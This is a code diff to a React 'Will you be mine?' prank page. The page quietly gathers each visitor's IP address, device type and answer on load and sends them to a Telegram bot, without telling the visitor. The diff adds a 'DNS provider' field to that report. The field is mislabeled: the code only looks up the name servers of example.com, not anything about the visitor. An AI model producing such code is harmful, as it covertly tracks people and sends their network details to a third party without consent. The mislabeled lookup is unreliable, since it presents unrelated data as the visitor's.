@@ -1,4 +1,3 @@
-//edit test
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import './styles.css'; // Import the CSS file
@@ -8,6 +7,7 @@ export default function Page() {
   const [yesPressed, setYesPressed] = useState(false);
   const [deviceType, setDeviceType] = useState('');
   const [ipAddress, setIpAddress] = useState('');
+  const [dnsProvider, setDnsProvider] = useState('');
 
   const yesButtonSize = noCount * 20 + 16;
 
@@ -61,7 +61,7 @@ export default function Page() {
     const chatId = '818897776';
     const now = new Date();
     const dateTime = `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
-    const message = `Someone answered "${answer}" to "Will you be mine?"\nDevice Type: ${getDeviceType()}\nDate/Time: ${dateTime}\nIP Address: ${ipAddress}`;
+    const message = `Someone answered "${answer}" to "Will you be mine?"\nDevice Type: ${getDeviceType()}\nDate/Time: ${dateTime}\nIP Address: ${ipAddress}\nDNS Provider: ${dnsProvider}`;
 
     try {
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -75,7 +75,7 @@ export default function Page() {
   };
 
   useEffect(() => {
-    // Fetch user IP address when component mounts
+    // Fetch user IP address and DNS provider when component mounts
     axios.get('https://api.ipify.org?format=json')
       .then(response => {
         setIpAddress(response.data.ip);
@@ -83,10 +83,21 @@ export default function Page() {
       .catch(error => {
         console.error('Error fetching IP address:', error);
       });
+
+    // Fetch DNS provider using DNS-over-HTTPS
+    axios.get('https://dns.google/resolve?name=example.com&type=NS')
+      .then(response => {
+        const dnsInfo = response.data?.Answer?.[0]?.data;
+        setDnsProvider(dnsInfo);
+      })
+      .catch(error => {
+        console.error('Error fetching DNS provider:', error);
+      });
   }, []);
 
   return (
     <div className="container">
+      <h2>DNS Provider: {dnsProvider}</h2>
       {yesPressed ? (
         <>
           <img src="https://media.tenor.com/gUiu1zyxfzYAAAAi/bear-kiss-bear-kisses.gif" alt="Kiss bear" />
@@ -115,4 +126,4 @@ export default function Page() {
       )}
     </div>
   );
-}
+        }
